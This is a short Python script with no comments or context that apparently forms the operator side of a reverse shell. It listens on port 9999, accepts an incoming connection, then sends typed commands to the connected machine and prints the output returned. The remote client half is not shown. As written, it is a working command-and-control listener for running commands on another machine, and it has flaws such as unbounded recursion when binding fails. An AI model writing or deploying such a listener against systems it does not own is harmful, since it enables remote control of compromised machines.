import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port = 9999
        s = socket.socket()
    except socket.error as obj:
        print(f"you have an error in formation of socket" + str(obj))


def bind_socket():

    global host
    global port
    global s
    try:
        print("binding with your socket")
        s.bind((host, port))
        s.listen(5)

    except socket.error as mssg:
        print(f"here is an error with {str(mssg)}")
        bind_socket()


def socket_accept():
    conn, address = s.accept()
    print("you are now connected with ip : " + str(address[0]) + "  and port is " + str(address[1]))
    send_command(conn)
    conn.close()


def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()


main()

